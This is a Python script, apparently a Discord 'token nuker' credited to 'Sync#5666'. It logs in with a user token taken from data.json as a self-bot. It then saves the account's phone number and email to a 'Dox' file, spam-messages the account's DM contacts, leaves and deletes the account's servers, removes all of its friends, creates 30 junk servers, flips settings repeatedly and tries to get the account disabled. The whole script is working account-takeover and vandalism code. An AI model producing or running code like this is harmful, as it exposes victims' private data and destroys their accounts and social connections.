from discord import channel
from discord.ext.commands.core import check, command
import requests
import json
import discord
import os
import random
import string
from discord.ext.commands import Bot
from requests.api import head
from itertools import cycle
import json
import colorama
from colorama import Fore, Back, Style

os.system('title Made by Sync#5666')

def banner():
    print(f"""
    {Fore.YELLOW}
    ╔══╗───────────  ╔═══╗
    ╚╣╠╝───────────  ║╔═╗║──────────────────╔╗
    ─║║╔══╦═╦══╦╗╔╗  ║║─║╠══╦═╦══╦══╦══╦═╦╗╔╣║
    ─║║║╔╗║╔╣╔╗║║║║  ║╚═╝║╔╗║╔╣║═╣══╣╔╗║╔╣║║╠╝
    ╔╣╠╣╚╝║║║╚╝║╚╝║  ║╔═╗║╚╝║║║║═╬══║╚╝║║║╚╝║
    ╚══╩══╩╝╚═╗╠══╝  ╚╝─╚╩═╗╠╝╚══╩══╩══╩╝╚══╝
    ────────╔═╝║───────  ╔═╝║
                                                                                                                                             Made by Sync#5666""")    

with open('data.json', 'r') as file:
    data = json.loads(file.read())
    TOKEN = data['token']
    MSG = data['message']
    STATUS = data['status']

def checkToken():
    if len(TOKEN) >= 8:
        print('Valid')
    elif len(TOKEN) < 8:
        print("Make sure you enter an ACTUAL token in 'data.json' ")
        input('Press any key to exit.')
        exit()

checkToken()

def clear():
    os.system('cls')

client = discord.Client()

bot = Bot(command_prefix = '>')

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

guilds = []
friends = []
chans = []

def genName(size=4, chars = string.ascii_uppercase + string.ascii_lowercase):
    return ''.join(random.choice(chars) for z in range(size))

def changeList():
    if len(chans) > 7:
        print('Changing the list.')
        while True:
            del chans[-1]
            if len(chans) == 7:
                break
        print(f'Modified list:  {chans}')
    elif len(chans) <= 7:
        print('List is good.')


def dox():

    headers = {
        'Authorization': TOKEN
    }

    data = requests.get('https://discord.com/api/v6/users/@me', headers=headers)

    if data.status_code == 200:
        try:
            phone = data.json()['phone']
            email = data.json()['email']
        except:
            pass

    with open(f'{bot.user.name} Dox.txt', 'w') as dox_file:
        dox_file.write(f'Account name: {bot.user}\n')
        dox_file.write(f'Account ID: {bot.user.id}\n')
        dox_file.write(f'Phone Number: {phone}\n')
        dox_file.write(f'Email: {email}\n')
        dox_file.write('\n')
        dox_file.write('                                                        Made by Sync#5666')

def disable():

    headers = {
        'Authorization': TOKEN
    }

    for i in range(1):
        requests.post('https://discordapp.com/api/v6/invite/gay', headers=headers)
        print('Attempt to disable the account.')

def change_status():

    headers = {
        'Authorization': TOKEN
    }

    for i in range(1):
        yellow = {"status": "idle"}
        ded = {"custom_status":{"text": STATUS}}
        try:
            requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json=yellow)
            requests.patch('https://discord.com/api/v9/users/@me/settings', headers=headers, json=ded)
        except:
            pass

def dmFriends():

    headers = {
        "Authorization": TOKEN
    }

    for i in range(1):
        for channel in chans:
            payload = {'content': MSG, 'nonce': channel,   'tts': 'false'}
            try:
                requests.post(f'https://discord.com/api/v9/channels/{channel}/messages', headers=headers, json=payload)
                print(f"Sent '{MSG}'")
            except:
                print(f"{Fore.RED} Couldn't dm {chans}")
                pass


def changeThemes():

    headers = {
        "Authorization": TOKEN
    }

    try:
        theme = cycle(['dark', 'light'])
        for x in range(100):
            settings = {'theme': next(theme), 'locale': random.choice(['ko', 'se', 'fi', 'ja'])}
            requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=settings)
    except:
        print('Something went wrong.')
        pass


def nuke():
    headers = {
        "Authorization": TOKEN
    }

    dox()
    dmFriends()

    for guild in guilds:
        try:
            requests.delete(f'https://discord.com/api/v6/users/@me/guilds/{guild}', headers=headers)
            print(f'Left from the guild with the id {guild}')
        except:
            print('Something went wrong.')
            pass

    for friend in friends:
        try:
            requests.delete(f'https://discord.com/api/v6/users/@me/relationships/{friend}', headers=headers)
            print(f'Unfriended the person with the id {friend}')
        except:
            print('Something went wrong.')
            pass

    # This is going to also delete the guilds that HE created.

    for guild in guilds:
        try:
            requests.delete(f'https://discord.com/api/v8/guilds/{guild}', headers=headers)
            print(f'Deleted the guild with the id {guild}')
        except:
            print('Something went wrong.')
            pass

    for x in range(30):
        try:
            data = {
                'name': genName(),
                'region': 'europe',
                'icon': None,
                'channels': None
            }
            requests.post('https://discord.com/api/v6/guilds', headers=headers, json=data)
        except:
            print('Something went wrong.')
            pass

    change_status()
    changeThemes()
    disable()

@bot.event
async def on_connect():
    for guild in bot.guilds:
        guilds.append(guild.id)

    for friend in bot.user.friends:
        friends.append(friend.id)

    for channels in bot.private_channels:
        chans.append(channels.id)

    
    print(f'Guilds: {guilds}')
    print(f'Friends {friends}')
    print(f'Channels: {chans}')
    clear()
    changeList()
    clear()
    banner()
    nuke()

bot.run(TOKEN, bot=False)